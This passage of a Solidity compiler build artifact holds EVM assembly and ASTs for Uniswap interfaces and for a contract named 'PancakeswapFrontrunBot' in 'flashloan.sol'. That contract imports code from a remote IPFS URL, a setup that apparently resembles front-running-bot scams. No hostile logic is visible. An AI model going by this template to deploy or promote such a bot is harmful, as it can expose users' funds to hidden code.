											"end": 10074,
											"name": "MUL",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP3",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "KECCAK256",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "tag",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SLOAD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH",
											"source": 4,
											"value": "1"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "DUP4",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "GT",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "17"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "tag",
											"source": 4,
											"value": "16"
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 10060,
											"end": 10074,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 9995,
											"end": 10080,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"getArray()": "d504ea1d",
							"myArray(uint256)": "cc3e57d9"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"getArray\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"myArray\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"arrayExample\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 1869,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:arrayExample",
								"label": "myArray",
								"offset": 0,
								"slot": "0",
								"type": "t_array(t_uint256)dyn_storage"
							}
						],
						"types": {
							"t_array(t_uint256)dyn_storage": {
								"base": "t_uint256",
								"encoding": "dynamic_array",
								"label": "uint256[]",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"contracts/interfaces/IUniswapV2Migrator.sol": {
				"ast": {
					"absolutePath": "contracts/interfaces/IUniswapV2Migrator.sol",
					"exportedSymbols": {
						"IUniswapV2Migrator": [
							15
						]
					},
					"id": 16,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 15,
							"linearizedBaseContracts": [
								15
							],
							"name": "IUniswapV2Migrator",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "b7df1d25",
									"id": 14,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "migrate",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "token",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "78:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "78:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 5,
												"mutability": "mutable",
												"name": "amountTokenMin",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "93:19:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 4,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "93:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 7,
												"mutability": "mutable",
												"name": "amountETHMin",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "114:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 6,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "114:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 9,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "133:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 8,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "133:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 11,
												"mutability": "mutable",
												"name": "deadline",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 14,
												"src": "145:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 10,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "145:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "77:82:0"
									},
									"returnParameters": {
										"id": 13,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "168:0:0"
									},
									"scope": 15,
									"src": "61:108:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 16,
							"src": "26:145:0"
						}
					],
					"src": "0:172:0"
				},
				"id": 0
			},
			"contracts/interfaces/V1/IUniswapV1Exchange.sol": {
				"ast": {
					"absolutePath": "contracts/interfaces/V1/IUniswapV1Exchange.sol",
					"exportedSymbols": {
						"IUniswapV1Exchange": [
							71
						]
					},
					"id": 72,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 17,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 71,
							"linearizedBaseContracts": [
								71
							],
							"name": "IUniswapV1Exchange",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "70a08231",
									"id": 24,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "balanceOf",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 19,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 24,
												"src": "80:13:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 18,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "80:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "79:15:1"
									},
									"returnParameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 22,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 24,
												"src": "118:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 21,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "118:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "117:6:1"
									},
									"scope": 71,
									"src": "61:63:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "23b872dd",
									"id": 35,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "transferFrom",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 26,
												"mutability": "mutable",
												"name": "from",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "151:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 25,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "151:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 28,
												"mutability": "mutable",
												"name": "to",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "165:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 27,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "165:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 30,
												"mutability": "mutable",
												"name": "value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "177:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 29,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "177:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "150:38:1"
									},
									"returnParameters": {
										"id": 34,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 33,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 35,
												"src": "207:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 32,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "207:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "206:6:1"
									},
									"scope": 71,
									"src": "129:84:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "f88bf15a",
									"id": 50,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "removeLiquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 44,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 37,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "243:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 36,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "243:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 39,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "249:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 38,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "249:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 41,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "255:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 40,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "255:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 43,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "261:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 42,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "261:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "242:24:1"
									},
									"returnParameters": {
										"id": 49,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 46,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "285:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 45,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "285:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 48,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 50,
												"src": "291:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 47,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "291:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "284:12:1"
									},
									"scope": 71,
									"src": "218:79:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "95e3c50b",
									"id": 61,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tokenToEthSwapInput",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 57,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "331:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 51,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "331:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 54,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "337:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 53,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "337:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 56,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "343:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 55,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "343:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "330:18:1"
									},
									"returnParameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 59,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 61,
												"src": "367:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 58,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "367:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "366:6:1"
									},
									"scope": 71,
									"src": "302:71:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": null,
									"functionSelector": "f39b5b9b",
									"id": 70,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "ethToTokenSwapInput",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 66,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 63,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 70,
												"src": "407:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 62,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "407:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 65,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 70,
												"src": "413:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 64,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "413:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "406:12:1"
									},
									"returnParameters": {
										"id": 69,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 68,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 70,
												"src": "445:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 67,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "445:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "444:6:1"
									},
									"scope": 71,
									"src": "378:73:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 72,
							"src": "26:427:1"
						}
					],
					"src": "0:454:1"
				},
				"id": 1
			},
			"contracts/interfaces/V1/IUniswapV1Factory.sol": {
				"ast": {
					"absolutePath": "contracts/interfaces/V1/IUniswapV1Factory.sol",
					"exportedSymbols": {
						"IUniswapV1Factory": [
							81
						]
					},
					"id": 82,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 73,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "IUniswapV1Factory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "06f2bf62",
									"id": 80,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getExchange",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 76,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 75,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 80,
												"src": "81:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 74,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "81:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "80:9:2"
									},
									"returnParameters": {
										"id": 79,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 78,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 80,
												"src": "113:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 77,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "113:7:2",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "112:9:2"
									},
									"scope": 81,
									"src": "60:62:2",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 82,
							"src": "26:98:2"
						}
					],
					"src": "0:125:2"
				},
				"id": 2
			},
			"flashloan.sol": {
				"ast": {
					"absolutePath": "flashloan.sol",
					"exportedSymbols": {
						"PancakeswapFrontrunBot": [
							1724
						]
					},
					"id": 1725,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 83,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:3"
						},
						{
							"absolutePath": "contracts/interfaces/IUniswapV2Migrator.sol",
							"file": "contracts/interfaces/IUniswapV2Migrator.sol",
							"id": 84,
							"nodeType": "ImportDirective",
							"scope": 1725,
							"sourceUnit": 16,
							"src": "87:53:3",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "contracts/interfaces/V1/IUniswapV1Exchange.sol",
							"file": "contracts/interfaces/V1/IUniswapV1Exchange.sol",
							"id": 85,
							"nodeType": "ImportDirective",
							"scope": 1725,
							"sourceUnit": 72,
							"src": "142:56:3",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "contracts/interfaces/V1/IUniswapV1Factory.sol",
							"file": "contracts/interfaces/V1/IUniswapV1Factory.sol",
							"id": 86,
							"nodeType": "ImportDirective",
							"scope": 1725,
							"sourceUnit": 82,
							"src": "200:55:3",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC",
							"file": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC",
							"id": 87,
							"nodeType": "ImportDirective",
							"scope": 1725,
							"sourceUnit": 1880,
							"src": "277:86:3",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [
								1838
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 1724,
							"linearizedBaseContracts": [
								1724
							],
							"name": "PancakeswapFrontrunBot",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "6c02a931",
									"id": 89,
									"mutability": "mutable",
									"name": "tokenName",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1724,
									"src": "409:23:3",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 88,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "409:6:3",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "7b61c320",
									"id": 91,
									"mutability": "mutable",
									"name": "tokenSymbol",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1724,
									"src": "439:25:3",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
